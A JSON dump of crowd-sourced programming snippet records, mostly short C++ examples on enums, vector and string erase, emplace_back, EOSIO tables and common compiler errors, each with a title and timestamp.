    "keyword": null,
    "link": null,
    "title": " else if",
    "description": "var age=20; if (age < 18) { \tconsole.log(\"underage\"); } else { \tconsole.log(\"let em in!\"); }\nif (5 < 10) { \tconsole.log(\"5 is less than 10\"); } else { \tconsole.log(\"5 is now bigger than 10\") }\nif ( x > 10 ) { cout << \"x is greater than 10\"; } else { cout << \"x is less than 10\"; }\n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1902,
    "keyword": null,
    "link": null,
    "title": " elseif c++",
    "description": "   if( a == 10 ) {       cout << \"Value of a is 10\" << endl;    } else if( a == 20 ) {       // if else if condition is true       cout << \"Value of a is 20\" << endl;    } \n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1903,
    "keyword": null,
    "link": null,
    "title": " emplace back vector c++",
    "description": "// vector::emplace_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector = {10,20,30};    myvector.emplace_back (100);   myvector.emplace_back (200);    std::cout << \"myvector contains:\";   for (auto& x: myvector)     std::cout << ' ' << x;   std::cout << '\\n';    return 0; }\n#include <vector> #include <string> #include <cassert> #include <iostream>   struct President {     std::string name;     std::string country;     int year;       President(std::string p_name, std::string p_country, int p_year)         : name(std::move(p_name)), country(std::move(p_country)), year(p_year)     {         std::cout << \"I am being constructed.\\n\";     }     President(President&& other)         : name(std::move(other.name)), country(std::move(other.country)), year(other.year)     {         std::cout << \"I am being moved.\\n\";     }     President& operator=(const President& other) = default; };   int main() {     std::vector<President> elections;     std::cout << \"emplace_back:\\n\";     auto& ref = elections.emplace_back(\"Nelson Mandela\", \"South Africa\", 1994);     assert(ref.year != 1984 && \"uses a reference to the created object (C++17)\");       std::vector<President> reElections;     std::cout << \"\\npush_back:\\n\";     reElections.push_back(President(\"Franklin Delano Roosevelt\", \"the USA\", 1936));       std::cout << \"\\nContents:\\n\";     for (President const& president: elections) {         std::cout << president.name << \" was elected president of \"                   << president.country << \" in \" << president.year << \".\\n\";     }     for (President const& president: reElections) {         std::cout << president.name << \" was re-elected president of \"                   << president.country << \" in \" << president.year << \".\\n\";     } }\n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1904,
    "keyword": null,
    "link": null,
    "title": " emplace vs push c++",
    "description": "push() adds a copy of an already constructed object into the queue as a  parameter, it takes an object of the queue's element type.  emplace() constructs a new object in-place at the end of the queue. It takes  as parameters the parameters that the queue's element types constructor takes.  If your usage pattern is one where you create a new object and add it to the container, you shortcut a few steps (creation of a temporary object and copying it) by using emplace().\n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1905,
    "keyword": null,
    "link": null,
    "title": " empty string in c++",
    "description": "str.empty()\n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1906,
    "keyword": null,
    "link": null,
    "title": " enable if vs enable if t",
    "description": "template<   class T,   std::enable_if_t<std::is_same<int, T>::value, int>* = nullptr > void f() { }  template<   class T,   std::enable_if_t<std::is_same<double, T>::value, int>* = nullptr > void f() { } \n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1907,
    "keyword": null,
    "link": null,
    "title": " enable interrupt avr",
    "description": "#include<avr/io.h> #include<avr/interrupt.h>  ISR (INT0_vect) { \tcode1;\t\t\t//Add your code } ISR (INT1_vect) { \tcode2;\t\t\t//Add your code }  int main { GICR=0xc0;   //Enable External Interrupts INT0 and INT1 \tMCUCR=0x08;  //Configure INT0 active low level triggered and INT1 as falling edge \t \tsei();     // Enable global interrupts by setting global interrupt enable bit in SREG } \n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1908,
    "keyword": null,
    "link": null,
    "title": " encryption hackerrank solution c++",
    "description": "#include <algorithm> #include <cmath> #include <fstream> #include <iostream> #include <ostream> #include <string> using namespace std;  string encryption(string& input) {         input.erase(std::remove(input.begin(), input.end(), ' '), input.end());      int size = input.length();     int lowerbound = (int) floor(sqrt(size));     int upperbound = (int) ceil(sqrt(size));     int total = upperbound * lowerbound;          while (total < size) {         if (lowerbound < upperbound) {             ++lowerbound;         } else {             ++upperbound;         }         total = upperbound * lowerbound;     }          char grid[lowerbound][upperbound] = {0};     int index = 0;          for (int row = 0; row < lowerbound; ++row) {         for (int col = 0; col < upperbound; ++col) {             if (index <= input.length() - 1) {                 grid[row][col] = input.at(index);                 ++index;             }         }     }          string encrypted = \"\";          for (int col = 0; col < upperbound; ++col) {         for (int row = 0; row < lowerbound; ++row) {             if (grid[row][col] != 0) {                 encrypted += grid[row][col];             }         }                  if (col != upperbound - 1) {             encrypted += \" \";         }     }          return encrypted; }  int main() {     ofstream fout(getenv(\"OUTPUT_PATH\"));     string s;          getline(cin, s);     string result = encryption(s);     fout << result << \"\\n\";     fout.close();     return 0; } \n",
    "reg_date": "2021-10-12T11:39:56.000Z"
  },
  {
    "id": 1909,
    "keyword": null,
    "link": null,
    "title": " end vs cend in cpp",
    "description": "cend: Returns a const_iterator pointing to the past-the-end element in the container. end: Returns an iterator pointing to the past-the-end element in the sequence.\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1910,
    "keyword": null,
    "link": null,
    "title": " english to decimal",
    "description": "#include<iostream> #include<cmath>  #include<limits> #include<string> void print_value(const size_t value); // bool IllegalCharacters(int,const std::string, int); bool isalpha_isspace(const std::string&);   int main() {     std::string eng2dec;     std::cout<<\"\\nPlease enter a string of small letters and spaces:\\t\";     getline(std::cin,eng2dec);      // checking if string is an alphabet or spaces      bool answer = isalpha_isspace(eng2dec);     if(answer == false)     {         std::cout<<\"\\nThe input string does not represent a number in base 27\"<<std::endl;         exit(1);     }     // looping throught the string and converting the value of chars to decimal with base 27     size_t value {0};     int decimal {0};     for(size_t i {0}; i<eng2dec.length(); ++i)     {            if(eng2dec[i]==' ')         {             decimal=0;         }else{             int power = (eng2dec.length()-1-i);             decimal = eng2dec[i]%96;                value+= decimal*pow(27,power);          }         if(value > pow(2,32)){             std::cout<<\"\\nThe input string represents a number that is greater than 2&circ;32\" <<std::endl;exit(1);         }      }     print_value(value);       return 0 ; }  // check if string is not alphabet or space  bool isalpha_isspace(const std::string& str ) {        bool answer ;     for(char c: str){         if(isalpha(c) || isspace(c))          {            answer = true;         }else         {            answer= false;         }     }     return answer ; }  // print value  void print_value(const size_t value){ \tstd::cout<<value<<std::endl;          } \n#include<iostream> #include<string> #include<cmath>  int main() {            std::cout<<\"Please enter a string of small letters and spaces:\\t\";     std::string str ;     getline(std::cin, str) ;           long int  result {0};     long int  value {0};     for(int i=0 ; i < str.length(); ++i)     {          switch(str[i]){                      case ' ':                 value = 0;                 break;             case 'A':             case 'a':                 value = 1;                 break;             case 'B':             case 'b':                 value = 2;                 break;             case 'C':             case 'c':                 value = 3;                 break;             case 'D':             case 'd':                 value = 4;                 break;             case 'E':             case 'e':                 value = 5;                 break;             case 'F':             case 'f':                 value = 6;                 break;             case 'G':             case 'g':                 value = 7;                 break;             case 'H':             case 'h':                 value = 8;                 break;             case 'I':             case 'i':                 value = 9;                 break;             case 'J':             case 'j':                 value = 10;                 break;             case 'K':             case 'k':                 value = 11;                 break;             case 'L':             case 'l':                 value = 12;                 break;             case 'M':             case 'm':                 value = 13;                 break;             case 'N':             case 'n':                 value = 14;                 break;             case 'O':             case 'o':                 value = 15;             case 'P':             case 'p':                 value = 16;                 break;             case 'Q':             case 'q':                 value = 17;                 break;             case 'R':             case 'r':                 value = 18;                 break;             case 'S':             case 's':                 value = 19;                 break;             case 'T':             case 't':                 value = 20;                 break;             case 'U':             case 'u':                 value = 21;                 break;             case 'V':             case 'v':                 value = 22;                 break;             case 'W':             case 'w':                 value = 23;                 break;             case 'X':             case 'x':                 value = 24;                 break;             case 'Y':             case 'y':                 value = 25;                 break;             case 'Z':             case 'z':                 value = 26;                 break;             default:                 std::cout<<\" The input string does not represent a number in base 27 \"<<std::endl;         }          int power = (str.length()-1-i);         result += value*(pow(27,power));     }     if(str.length()>= 32)     {                    std::cout<<\"\\nThe input string represents a number that is greater than 2&circ;32\"<<std::endl;              }else{         std::cout<<\"\\n\"<<result<<std::endl;     }           return 0 ; }  \n#include<iostream> #include<string> #include<limits>  inline std::string binary_conv(int,int,std::string);  int main() {     long int number;     int base {27};     std::cout<<\"\\nPlease enter a non-negative integer:\\t\";     std::cin>>number;       while(1)     {         if(std::cin.fail())         {         std::cin.clear();         std::cin.ignore(std::numeric_limits<std::streamsize>::max(),'\\n');         std::cout<<\"\\nYou have entered wrong input!\"<<std::endl;         std::cout<<\"\\nPlease enter a non-negative integer:\\t\";         std::cin>>number;     }         if(!std::cin.fail())         break;     }          std::string binary_number;     binary_number = binary_conv(number,base,binary_number);               std::cout<<binary_number<<std::endl;         return 0 ; }  std::string binary_conv(int number, int base,std::string binary) {        std::string zero_one = \" abcdefghijklmnopqrstuvwxyz\";     if(number==0)         return binary;     binary = zero_one[number%base]+binary;     number/=base;     return binary_conv(number,base,binary); }   \n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1911,
    "keyword": null,
    "link": null,
    "title": " english to french typing online",
    "description": "for (int i = 0; i < 2; i++){ \tcout << i << endl; }      \n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1912,
    "keyword": null,
    "link": null,
    "title": " entering char in int c++ avoid loop",
    "description": "cin.clear(); cin.ignore(100, '\\n'); //100 --> asks cin to discard 100 characters from the input stream.\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1913,
    "keyword": null,
    "link": null,
    "title": " enum c++",
    "description": "enum season { spring, summer, autumn, winter };\nenum Colors {         BLACK,         GREEN,         BLUE,         RED };\n#include <iostream> enum Example :unsigned char // char will work but float will not work because it is not an interger { \tA = 9, B = 56, c = 12//values must be integers };//enum is a just a name for a group of numeric values  int main() { \tExample example = A; \t//\tExample example2 = 5;// This gives error because the values must be A , B ,C no other values are accepted in our code however we can break this behaiour in c++ \tif (example == A)//We can use A directly because it is just an unsigned char var but is grouped in Example enum with other values \t\tstd::cout << \"Good\" << std::endl; \tstd::cin.get();    }\nenum Foo { a, b, c = 10, d, e = 1, f, g = f + c }; //a = 0, b = 1, c = 10, d = 11, e = 1, f = 2, g = 12\nenum season  {   spring = 0,      summer = 4,      autumn = 8,     winter = 12 };\nenum names {blah1, Blah2 , blah3};\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1914,
    "keyword": null,
    "link": null,
    "title": " enum in c++",
    "description": "#include <iostream> enum Example :unsigned char // char will work but float will not work because it is not an interger { \tA = 9, B = 56, c = 12//values must be integers };//enum is a just a name for a group of numeric values  int main() { \tExample example = A; \t//\tExample example2 = 5;// This gives error because the values must be A , B ,C no other values are accepted in our code however we can break this behaiour in c++ \tif (example == A)//We can use A directly because it is just an unsigned char var but is grouped in Example enum with other values \t\tstd::cout << \"Good\" << std::endl; \tstd::cin.get();    }\nenum Foo { a, b, c = 10, d, e = 1, f, g = f + c }; //a = 0, b = 1, c = 10, d = 11, e = 1, f = 2, g = 12\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1915,
    "keyword": null,
    "link": null,
    "title": " eosio check account exist",
    "description": "check(is_account(\"accountname\"_n),\"Account not fount\");\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1916,
    "keyword": null,
    "link": null,
    "title": " eosio get time",
    "description": "uint32_t now(){return current_time_point().sec_since_epoch();}\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1917,
    "keyword": null,
    "link": null,
    "title": " eosio multi index clear",
    "description": "template<name::raw A, typename B, typename... C> void clear_table(multi_index<A, B, C...>* table) {  \tauto it = table->begin();  \twhile (it != table->end()) { it = table->erase(it); }  };  clear_table(&_table);\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1918,
    "keyword": null,
    "link": null,
    "title": " eosio multi index secondary index",
    "description": "voting::identity_index identities(_self, _self.value); auto idx = identities.get_index<\"byhash\"_n>(); auto itr = idx.find(out); eosio_assert(itr == identities.end(), \"User already registered to vote!\");\n",
    "reg_date": "2021-10-12T11:39:57.000Z"
  },
  {
    "id": 1919,
    "keyword": null,
    "link": null,
    "title": " eosio name to string",
    "description": "std::string str = account.to_string();\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1920,
    "keyword": null,
    "link": null,
    "title": " eosio parse string",
    "description": "  const size_t fb = str.find(\",\");   auto d1 = str.substr(0 , fb);   auto d2 = str.substr(fb + 1);\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1921,
    "keyword": null,
    "link": null,
    "title": " eosio require find",
    "description": "check(table.require_find(ind),\"require item not found\");\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1922,
    "keyword": null,
    "link": null,
    "title": " epoch  execution time in c++",
    "description": "#include <iostream> #include <ctime> #include <cmath> using namespace std;  int main () { \tfloat x,y; \tclock_t time_req;  \t// Using pow function \ttime_req = clock(); \tfor(int i=0; i<100000; i++) \t{ \t\ty = log(pow(i,5)); \t} \ttime_req = clock() - time_req; \tcout << \"Using pow function, it took \" << (float)time_req/CLOCKS_PER_SEC << \" seconds\" << endl; \t \t// Without pow function \ttime_req = clock(); \tfor(int i=0; i<100000; i++) \t{ \t\ty = log(i*i*i*i*i); \t} \ttime_req = clock()- time_req; \tcout << \"Without using pow function, it took \" << (float)time_req/CLOCKS_PER_SEC << \" seconds\" << endl;  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1923,
    "keyword": null,
    "link": null,
    "title": " equal elements in two arrays in c++",
    "description": "bool equalelementsintwoarrays(int A[], int B[], int N) {     sort(A, A+N);     sort(B, B+N);     int i = 0, j = 0;     while (i < N && j < N) {         if (A[i] == B[j]) return true;         else if (A[i] > B[j]) j++;         else i++;     }     return false; }\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1924,
    "keyword": null,
    "link": null,
    "title": " equals operator c++ overlaod",
    "description": "  MyClass& MyClass::operator=(const MyClass &rhs) {      // Only do assignment if RHS is a different object from this.     if (this != &rhs) {       ... // Deallocate, allocate new space, copy values...     }      return *this;   }\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1925,
    "keyword": null,
    "link": null,
    "title": " erase an element from vector c++",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n#include <iostream> #include <utility> #include <vector>  using namespace std;   int main() {     vector< pair<int, int> > v;     int N = 5;     const int threshold = 2;     for(int i = 0; i < N; ++i)         v.push_back(make_pair(i, i));      int i = 0;     while(i < v.size())         if (v[i].second > threshold)             v.erase(v.begin() + i);         else             i++;      for(int i = 0; i < v.size(); ++i)         cout << \"(\" << v[i].first << \", \" << v[i].second << \")\\n\";      cout << \"Done\" << endl; }\n#include<bits/stdc++.h> using namespace std; int main(){     vector<int> v;     //Insert values 1 to 10     v.push_back(20);     v.push_back(10);     v.push_back(30);     v.push_back(20);     v.push_back(40);     v.push_back(20);     v.push_back(10);      vector<int>::iterator new_end;     new_end = remove(v.begin(), v.end(), 20);      for(int i=0;i<v.size(); i++){         cout << v[i] << \" \";     }     //Prints [10 30 40 10]     return 0; } C++Copy\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1926,
    "keyword": null,
    "link": null,
    "title": " erase element from vector c++",
    "description": "// Deletes the second element (vec[1]) vec.erase(vec.begin() + 1);  // Deletes the second through third elements (vec[1], vec[2]) vec.erase(vec.begin() + 1, vec.begin() + 3);\n#include <algorithm> #include <vector>  // using the erase-remove idiom  std::vector<int> vec {2, 4, 6, 8}; int value = 8 // value to be removed vec.erase(std::remove(vec.begin(), vec.end(), value), vec.end());\nvector.erase( vector.begin() + 3 ); // Deleting the fourth element\n// Deleting first element vector_name.erase(vector_name.begin());  // Deleting xth element from start vector_name.erase(vector_name.begin()+(x-1));  // Deleting from the last vector_name.pop_back();\nvector.erase(position) // remove certain position // or vector.erase(left,right) // remove positions within range \n  // erase element from vector by its index     vector<string> strs {\"first\", \"second\", \"third\", \"last\"};            string element = \"third\"; // the element which will be erased     for(int i=0;i<strs.size();i++)     {       if(strs[i] == element)       strs.erase(strs.begin()+i);     }      \n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1927,
    "keyword": null,
    "link": null,
    "title": " erase string c++",
    "description": "str.pop_back(); // removes last /back character from str str.erase(str.begin()); // removes first/front character from str\n// string::erase #include <iostream> #include <string>  int main () {   std::string str (\"This is an example sentence.\");   std::cout << str << '\\n';                                            // \"This is an example sentence.\"   str.erase (10,8);                        //            ^^^^^^^^   std::cout << str << '\\n';                                            // \"This is an sentence.\"   str.erase (str.begin()+9);               //           ^   std::cout << str << '\\n';                                            // \"This is a sentence.\"   str.erase (str.begin()+5, str.end()-9);  //       ^^^^^   std::cout << str << '\\n';                                            // \"This sentence.\"   return 0; }\n#include <iostream> #include <algorithm> #include <string>   int main() {     std::string s = \"This is an example\";     std::cout << s << '\\n';       s.erase(0, 5); // Erase \"This \"     std::cout << s << '\\n';       s.erase(std::find(s.begin(), s.end(), ' ')); // Erase ' '     std::cout << s << '\\n';       s.erase(s.find(' ')); // Trim from ' ' to the end of the string     std::cout << s << '\\n'; }\n string& erase (size_t pos = 0, size_t len = npos); /* pos Position of the first character to be erased. If this is greater than the string length, it throws out_of_range. Note: The first character in str is denoted by a value of 0 (not 1). len Number of characters to erase (if the string is shorter, as many characters as possible are erased). A value of string::npos indicates all characters until the end of the string. */\n#include<iostream> #include<string>  using namespace std; int main() {    string text = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";     cout << \"Initial string: \" << text << endl;     text.erase(10, string::npos);   // string.erase(pos1, pos2) removes the part of the string between position 1 and 2.   // In this case, between character 10 and the end of the string.     cout << \"Final string: \" << text; }\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1928,
    "keyword": null,
    "link": null,
    "title": " erasing a character from a string in c++",
    "description": "str.pop_back(); // removes last /back character from str str.erase(str.begin()); // removes first/front character from str\n#include<iostream> #include<algorithm>  using namespace std; main() {    string my_str = \"ABAABACCABA\";     cout << \"Initial string: \" << my_str << endl;     my_str.erase(remove(my_str.begin(), my_str.end(), 'A'), my_str.end()); //remove A from string    cout << \"Final string: \" << my_str; }\n// string::erase #include <iostream> #include <string>  int main () {   std::string str (\"This is an example sentence.\");   std::cout << str << '\\n';                                            // \"This is an example sentence.\"   str.erase (10,8);                        //            ^^^^^^^^   std::cout << str << '\\n';                                            // \"This is an sentence.\"   str.erase (str.begin()+9);               //           ^   std::cout << str << '\\n';                                            // \"This is a sentence.\"   str.erase (str.begin()+5, str.end()-9);  //       ^^^^^   std::cout << str << '\\n';                                            // \"This sentence.\"   return 0; }\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1929,
    "keyword": null,
    "link": null,
    "title": " error: 'std::high resolution clock' has not been declared",
    "description": "#include <chrono> using std::chrono::high_resolution_clock; using std::chrono::microseconds; using std::chrono::duration_cast;  auto start = high_resolution_clock::now(); rd(n); auto stop = high_resolution_clock::now(); auto duration = duration_cast<microseconds>(stop-start); std::cout << duration.count() << std::endl;\n",
    "reg_date": "2021-10-12T11:39:58.000Z"
  },
  {
    "id": 1930,
    "keyword": null,
    "link": null,
    "title": " error: ‘CV WINDOW AUTOSIZE’ was not declared in this scope",
    "description": "#include <opencv2/highgui/highgui.hpp>  NOTE: since all the windowing stuff is in the highgui module, you'll need to include above header.  Example error: prashad@ubuntu:~/test$ g++ create_ipl_image.cpp   `pkg-config opencv cvblob --cflags --libs`  create_ipl_image.cpp: In function &lsquo;int main()&rsquo;: create_ipl_image.cpp:14:31: error: &lsquo;CV_WINDOW_AUTOSIZE&rsquo; was not declared in this scope       cvNamedWindow( \"Image2\", CV_WINDOW_AUTOSIZE ); \n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1931,
    "keyword": null,
    "link": null,
    "title": " error: ‘memset’ was not declared in this scope in cpp",
    "description": "C: #include <string.h>  C++: #include <cstring>  NOTE: inclusion of above headers works fine \n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1932,
    "keyword": null,
    "link": null,
    "title": " error: ISO C++ forbids comparison between pointer and integer [-fpermissive] if(s[i] != \"b\"){",
    "description": "if (response == 'Y')\n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1933,
    "keyword": null,
    "link": null,
    "title": " error: Microsoft Visual C++ 14.0 is required. Get it with \"Build Tools for Visual Studio\": https://visualstudio.microsoft.com/downloads/",
    "description": "pip install --only-binary :all: pycrypto \nClick on Help > Check for updates and update your visual studio\nYou need to update your IDE\n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1934,
    "keyword": null,
    "link": null,
    "title": " error: default argument given for parameter",
    "description": "/* You are probably redefining the default parameter in the implementation of the function.  It should only be defined in the function declaration. */ //bad (this won't compile) string Money::asString(bool shortVersion=true){ }  //good (The default parameter is commented out, but you can remove it totally) string Money::asString(bool shortVersion /*=true*/){ }  //also fine, but maybe less clear as the commented out default parameter is removed string Money::asString(bool shortVersion){ } \n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1935,
    "keyword": null,
    "link": null,
    "title": " error: invalid conversion from ‘int*’ to ‘int’ [-fpermissive]",
    "description": "#include<iostream> using namespace std;  int main() {     int a[]={5,6,7,8,10};     int *p,*q;     *p=&a[0];     *q=&a[4];      }\n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1936,
    "keyword": null,
    "link": null,
    "title": " error: invalid use of template-name without an argument list",
    "description": "template<typename T> LinkedList<T>::LinkedList() {    start = nullptr;    current = nullptr; }\n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1937,
    "keyword": null,
    "link": null,
    "title": " error: use of parameter outside function body before ] token c++, 2D array in c++",
    "description": "If you are using GCC, then you are to pass the length of the array as a parameter to the function.  void foo (int m, int arr[][m]) {     //... } However, there seems to be a bug in either the compiler or the documentation, as the above function prototype syntax only works when compiling C code, not C++ (as of gcc version 4.8.2). The only work-around I found was to use a void * parameter, and cast it int the function body:  int foo_workaround (int m, void *x) {     int (*arr)[m] = static_cast<int (*)[m]>(x);     //... } There are other solutions if you do not want to rely on a compiler extension. If you don't mind a separate allocation for each row, you can use a vector of vectors, for example:  std::vector<std::vector<int> > arr(n, std::vector<int>(m));\n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1938,
    "keyword": null,
    "link": null,
    "title": " error: use of parameter outside function body before ] token c++",
    "description": "If you are using GCC, then you are to pass the length of the array  as a parameter to the function.  void foo (int m, int arr[][m]) {     //... }  However, there seems to be a bug in either the compiler or  the documentation, as the above function prototype syntax  only works when compiling C code, not C++ (as of gcc version 4.8.2).  The only work-around I found was to use a void * parameter,  and cast it int the function body:  int foo_workaround (int m, void *x) {     int (*arr)[m] = static_cast<int (*)[m]>(x);     //... }  There are other solutions if you do not want to rely on a compiler extension. If you don't mind a separate allocation for each row,  you can use a vector of vectors, for example:  std::vector<std::vector<int> > arr(n, std::vector<int>(m));\n",
    "reg_date": "2021-10-12T11:39:59.000Z"
  },
  {
    "id": 1939,
    "keyword": null,
    "link": null,
    "title": " error C2011",
    "description": "/*   *You need to top and tail your header file with an include guard,   * in order to avoid calling the header file twice (Once in header of child   * class, once in main). In order to have header specificy, it's best to  * derive the name from the name of the class. */ #ifndef HEADERNAME_H #define HEADERNAME_H // Header code i.e. class... #endif\n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1940,
    "keyword": null,
    "link": null,
    "title": " error C4840: non-portable use of class 'FString' as an argument to a variadic function",
    "description": "Dereference the string. Instead of UE_LOG(LogTemp, Warning, TEXT(\"%s\"), MyString); Instead do UE_LOG(LogTemp, Warning, TEXT(\"%s\"), *MyString);\n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1941,
    "keyword": null,
    "link": null,
    "title": " error c4001",
    "description": "#pragma warning(disable:4001)\n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1942,
    "keyword": null,
    "link": null,
    "title": " error c4001 site:docs.microsoft.com",
    "description": "#pragma warning(disable:4001)\n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1943,
    "keyword": null,
    "link": null,
    "title": " error in c++",
    "description": " ==========\tError Status =========   AC: Accepted   WA: Wrong Answer    TLE: Time Limit Exceeded    MLE: Memory Limit Exceeded    OLE: Output Limit Exceeded    IR: Invalid Return    RTE: Runtime Error    CE: Compile Error \n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1944,
    "keyword": null,
    "link": null,
    "title": " error jump to case label",
    "description": "put everything in the case x: under {} brackets metti tutto quello nel case x: sotto le parentesi {}\nswitch (choice) {     case 1: get_two_numbers(x, y);             //* vv here vv *             int sum = add(x, y);             //* ^^ here ^^ */             cout << x << \" + \" << y << \" = \" <<  sum << endl;             break;     case 2: get_two_numbers(x, y);             //* vv here vv */             int diff = subtract(x, y);             //* ^^ here ^^ */             cout << x << \" - \" << y << \" = \" <<  diff << endl;             break;     default:; }\nswitch (choice) {     case 1:         {             get_two_numbers(x, y);             int sum = add(x, y);             cout << x << \" + \" << y << \" = \" <<  sum << endl;         }         break;     case 2:         {             get_two_numbers(x, y);             int diff = subtract(x, y);             cout << x << \" - \" << y << \" = \" <<  diff << endl;         }         break;     default:         break; }\n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1945,
    "keyword": null,
    "link": null,
    "title": " error uploading arduino code",
    "description": "sudo chmod a+rw /dev/ttyACM0 \n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1946,
    "keyword": null,
    "link": null,
    "title": " escape sequence in c++",
    "description": " Escape sequence\tHex value in ASCII\tCharacter represented \\a\t07\tAlert (Beep, Bell) (added in C89)[1] \\b\t08\tBackspace \\enote 1\t1B\tEscape character \\f\t0C\tFormfeed Page Break \\n\t0A\tNewline (Line Feed); see notes below \\r\t0D\tCarriage Return \\t\t09\tHorizontal Tab \\v\t0B\tVertical Tab \\\\\t5C\tBackslash \\'\t27\tApostrophe or single quotation mark \\\"\t22\tDouble quotation mark \\?\t3F\tQuestion mark (used to avoid trigraphs) \\nnnnote 2\tany\tThe byte whose numerical value is given by nnn interpreted as an octal number \\xhh&hellip;\tany\tThe byte whose numerical value is given by hh&hellip; interpreted as a hexadecimal number \\uhhhhnote 3\tnone\tUnicode code point below 10000 hexadecimal \\Uhhhhhhhhnote 4\tnone\tUnicode code point where h is a hexadecimal digit  \t\t\t\t\t\t\t\t\t\t\t\t\t\t//code by gokul aakash\nescape squence \n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1947,
    "keyword": null,
    "link": null,
    "title": " escribir texto c++",
    "description": "#include <iostream> using namespace std; int main(){   cout<<\"Hola mundo\"<<endl;   return 0; }\n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1948,
    "keyword": null,
    "link": null,
    "title": " escrita em ficheiros c++",
    "description": "#include <stdio.h> #include <conio.h> void main() {   FILE *arq;   int i;   int result;   clrscr();   arq = fopen(\"ArqGrav.txt\", \"wt\");  // Cria um arquivo texto para grava&ccedil;&atilde;o   if (arq == NULL) // Se n&agrave;o conseguiu criar   {      printf(\"Problemas na CRIACAO do arquivo\\n\");      return;   }   for (i = 0; i<10;i++)   { // A funcao 'fprintf' devolve o n&uacute;mero de bytes gravados  // ou EOF se houve erro na grava&ccedil;&atilde;o       result = fprintf(arq,\"Linha %d\\n\",i);  \t\t\t\t\t         if (result == EOF)\t\t     \t  printf(\"Erro na Gravacao\\n\");   }   fclose(arq); }  \n",
    "reg_date": "2021-10-12T11:40:00.000Z"
  },
  {
    "id": 1949,
    "keyword": null,
    "link": null,
    "title": " esercizi su while loop java",
    "description": "public class SommaDueVar {      public static void main (String[] args) {         int somma = 0;                 int num;          System.out.print(\"Immetti un intero: \");         num = Input.readInt();         somma = somma + num;                  System.out.print(\"Immetti un intero: \");         num = Input.readInt();         somma = somma + num;          System.out.print(\"Immetti un intero: \");         num = Input.readInt();         somma = somma + num;          System.out.print(\"Immetti un intero: \");         num = Input.readInt();                 somma = somma + num;          System.out.print(\"Immetti un intero: \");         num = Input.readInt();                 somma = somma + num;          System.out.println (\"La somma e' \" + somma);     } } \n",
    "reg_date": "2021-10-12T11:40:01.000Z"
  },
  {
    "id": 1950,
    "keyword": null,
    "link": null,
    "title": " esp",
    "description": "{   \"name\": \"Exception\",   \"appId\": \"Espace assur&eacute;\",   \"user\": \"ESPA\",   \"id\": \"ESPA-1619606186708\",   \"url\": \"/home\",   \"url_server\": \"http://localhost:8080/T9-Assurance/SiroccoDevis/ajouterQuestionnaires\",   \"status\": \"406\",   \"message\": \"L'&eacute;xecution du d&eacute;clencheur [1 201 819] a &eacute;chou&eacute; : [Impossible de trouver de la question ayant le code [TEMPDC_PS] dans le questionnaire ayant le code [HOMCL_TPT]]\",   \"stack\": \"Not Acceptable\" }  \n",
